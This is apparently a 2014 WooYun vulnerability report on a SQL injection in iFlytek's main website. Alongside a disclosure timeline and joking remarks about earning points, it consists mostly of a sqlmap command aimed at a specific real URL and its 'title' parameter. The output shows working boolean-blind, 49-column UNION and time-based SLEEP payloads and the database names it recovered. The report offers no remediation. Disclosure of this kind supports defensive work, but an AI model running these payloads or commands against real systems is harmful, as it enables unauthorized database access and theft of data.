wybug_title: 科大讯飞主站SQL注入一枚
wybug_detail:
漏洞详情 披露状态：   									2014-08-09：	细节已通知厂商并且等待厂商处理中									2014-08-12：	厂商已经确认，细节仅向厂商公开									2014-08-22：	细节向核心白帽子及相关领域专家公开									2014-09-01：	细节向普通白帽子公开									2014-09-11：	细节向实习白帽子公开									2014-09-23：	细节向公众公开  简要描述： 听说你们很厉害 提交必忽略 求RANK 详细说明：  求基友一起LOL LOL LOL C:\Python27\sqlmap>sqlmap.py -u "http://www.iflytek.com/index.php?a=contactmap&catid=120&title=" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:56:09[18:56:09] [WARNING] using 'C:\Documents and Settings\Administrator\.sqlmap\output' as the output directory[18:56:09] [INFO] resuming back-end DBMS 'mysql'[18:56:09] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: title    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: a=contactmap&catid=120&title=%' AND 2457=2457 AND '%'='    Type: UNION query    Title: MySQL UNION query (NULL) - 49 columns    Payload: a=contactmap&catid=120&title=%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716f736a71,0x4a4a55686e67546d4551,0x716c707171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: a=contactmap&catid=120&title=%' AND SLEEP(5) AND '%'='---[18:56:09] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5.0.11[18:56:09] [INFO] fetching database namesavailable databases [5]:[*] information_schema[*] kdxfen[*] kdxfnew[*] mysql[*] test[18:56:09] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\www.iflytek.com'   漏洞证明：  



刷点分 不介意吧。   修复方案：     版权声明：转载请注明来源 Lonely@乌云
